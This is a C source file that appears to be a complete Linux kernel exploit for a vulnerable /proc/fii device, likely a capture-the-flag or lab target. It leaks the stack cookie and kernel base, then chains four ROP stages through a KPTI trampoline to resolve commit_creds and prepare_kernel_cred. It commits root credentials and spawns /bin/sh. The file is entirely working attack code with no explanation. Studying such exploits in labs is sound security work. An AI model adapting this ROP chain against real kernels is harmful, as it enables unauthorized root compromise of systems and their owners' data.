#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>

uint64_t stack_cookie;

uint64_t ksymtab_commit_creds, ksymtab_prepare_kernel_cred;

uint64_t commit_creds, prepare_kernel_cred;

uint64_t pop_rdi; // pop rdi; ret
uint64_t pop_rax; // pop rax; ret
uint64_t ret_instruction; // ret
uint64_t mov_rax_add_10_ret; // mov rax, [rax+0x10]; ret
uint64_t kpti_trampoline;
uint64_t init_task_location;

uint64_t user_sp, user_ss, user_cs, user_rflags;
uint64_t pointer_to_cred_struct;

int file_descriptor;

uint64_t temp_store;

void save_commit_creds();
void stage2();
void save_prepare_kernel_cred();
void stage3();
void save_struct_prepare_kernel_cred();
void stage4();
void execute_shell();

void setup_addresses(uint64_t text_section) {
    ksymtab_commit_creds = text_section + 0x144ed10; // add 8 to get the address pointer
    ksymtab_prepare_kernel_cred = text_section + 0x1459384; // add 8 to get address pointer
    pop_rdi = text_section + 0x1bd89;
    pop_rax = text_section + 0xa944ac;
    ret_instruction = text_section + 0xa944ad;
    mov_rax_add_10_ret = text_section + 0x9871c7;
    kpti_trampoline = text_section + 0xc01698;
    init_task_location = text_section + 0x160c980;

    printf("[*] ksymtab_commit_creds @ 0x%08lx\n", ksymtab_commit_creds);
    printf("[*] ksymtab_prepare_kernel_cred @ 0x%08lx\n", ksymtab_prepare_kernel_cred);
    printf("\n");
    printf("[+] kpti_trampoline @ 0x%08lx\n", kpti_trampoline);
}

void save_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state of the process");
}

void stage1() {
    uint64_t exploit[256];
    int offset = 32;
    exploit[offset++] = stack_cookie;
    exploit[offset++] = 0x0; // dummy rbx value
    exploit[offset++] = 0x0; // dummy rbp value
    exploit[offset++] = pop_rax; // set RIP to pop rax; ret
    exploit[offset++] = ksymtab_commit_creds - 0x10; 
    exploit[offset++] = mov_rax_add_10_ret;
    exploit[offset++] = kpti_trampoline;
    exploit[offset++] = 0x0; // pop rax
    exploit[offset++] = 0x0; // pop rdi
    exploit[offset++] = (uint64_t)save_commit_creds;
    exploit[offset++] = user_cs;
    exploit[offset++] = user_rflags;
    exploit[offset++] = user_sp;
    exploit[offset++] = user_ss;

    printf("Getting the commit_creds function!\n");
    write(file_descriptor, exploit, 46 * sizeof(uint64_t));

    printf("[-] This should never be reached!\n");
}

void save_commit_creds() {
    __asm__ (
        ".intel_syntax noprefix;"
        "mov temp_store, rax;"
        ".att_syntax;"
    );
    commit_creds = ksymtab_commit_creds + (int)temp_store;
    printf("[+] Got the commit creds address: 0x%08lx\n", commit_creds);

    stage2();
}

void stage2() {
    uint64_t exploit[256];
    int offset = 32;
    exploit[offset++] = stack_cookie;
    exploit[offset++] = 0x0; // dummy rbx value
    exploit[offset++] = 0x0; // dummy rbp value
    exploit[offset++] = pop_rax; // set RIP to pop rax; ret
    exploit[offset++] = ksymtab_prepare_kernel_cred - 0x10; 
    exploit[offset++] = mov_rax_add_10_ret;
    exploit[offset++] = kpti_trampoline;
    exploit[offset++] = 0x0; // pop rax
    exploit[offset++] = 0x0; // pop rdi
    exploit[offset++] = (uint64_t)save_prepare_kernel_cred;
    exploit[offset++] = user_cs;
    exploit[offset++] = user_rflags;
    exploit[offset++] = user_sp;
    exploit[offset++] = user_ss;

    printf("Getting the prepare_kernel_cred function!\n");
    write(file_descriptor, exploit, 47 * sizeof(uint64_t));

    printf("[-] This should never be reached!\n");
}

void save_prepare_kernel_cred() {
    __asm__ (
        ".intel_syntax noprefix;"
        "mov temp_store, rax;"
        ".att_syntax;"
    );
    prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int)temp_store;
    printf("[+] Got the prepare_kernel_cred address: 0x%08lx\n", prepare_kernel_cred);

    stage3();
}

void stage3() {
    uint64_t exploit[256];
    int offset = 32;
    exploit[offset++] = stack_cookie;
    exploit[offset++] = 0x0; // dummy rbx value
    exploit[offset++] = 0x0; // dummy rbp value
    exploit[offset++] = pop_rdi; // set RIP to pop rdi; ret
    exploit[offset++] = init_task_location; // set to init_cred
    exploit[offset++] = prepare_kernel_cred; // return to prepare_kernel_cred
    exploit[offset++] = ret_instruction; // NOP
    exploit[offset++] = kpti_trampoline;
    exploit[offset++] = 0x0; // pop rax
    exploit[offset++] = 0x0; // pop rdi
    exploit[offset++] = (uint64_t)save_struct_prepare_kernel_cred;
    exploit[offset++] = user_cs;
    exploit[offset++] = user_rflags;
    exploit[offset++] = user_sp;
    exploit[offset++] = user_ss;

    printf("Getting the prepare_kernel_cred structure for root creds!\n");
    write(file_descriptor, exploit, 47 * sizeof(uint64_t));

    printf("[-] This should never be reached!\n");
}

void save_struct_prepare_kernel_cred() {
    __asm__ (
        ".intel_syntax noprefix;"
        "mov temp_store, rax;"
        ".att_syntax;"
    );
    pointer_to_cred_struct = (uint64_t)temp_store;
    printf("[+] Got pointer root creds: 0x%08lx\n", pointer_to_cred_struct);

    stage4();
}

void stage4() {
    uint64_t exploit[256];
    int offset = 32;
    exploit[offset++] = stack_cookie;
    exploit[offset++] = 0x0; // dummy rbx value
    exploit[offset++] = 0x0; // dummy rbp value
    exploit[offset++] = pop_rdi; // set RIP to pop rax; ret
    exploit[offset++] = pointer_to_cred_struct; // set the pointer to the struct
    exploit[offset++] = commit_creds; // return to commit creds
    exploit[offset++] = ret_instruction; // NOP 
    exploit[offset++] = kpti_trampoline;
    exploit[offset++] = 0x0; // pop rax
    exploit[offset++] = 0x0; // pop rdi
    exploit[offset++] = (uint64_t)execute_shell;
    exploit[offset++] = user_cs;
    exploit[offset++] = user_rflags;
    exploit[offset++] = user_sp;
    exploit[offset++] = user_ss;

    printf("[+] Commiting the root creds!\n");
    write(file_descriptor, exploit, 47 * sizeof(uint64_t));

    printf("[-] This should never be reached!\n");
}

void execute_shell() {
    printf("[*] Got UID: %d!!!!!!\n", getuid());

    char *argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    exit(0);
}


int main() {
    int status;
    int fd = open("/proc/fii", O_RDWR);
    if (fd == -1) {
        perror("Could not open /proc/fii");
        return -1;
    }

    file_descriptor = fd;

    uint64_t buffer[256];
    status = read(fd, buffer, 128 * sizeof(uint64_t));
    if (status < 0) {
        perror("Could not read!");
        return -1;
    }
    stack_cookie = buffer[32];

    uint64_t stable_address = buffer[0x22];
    uint64_t text_section = stable_address - 0x27b1ef;

    printf("[*] The address of the of _text @ 0x%016lx\n", text_section);
    setup_addresses(text_section);
    save_state();

    stage1();
    return 0;
}

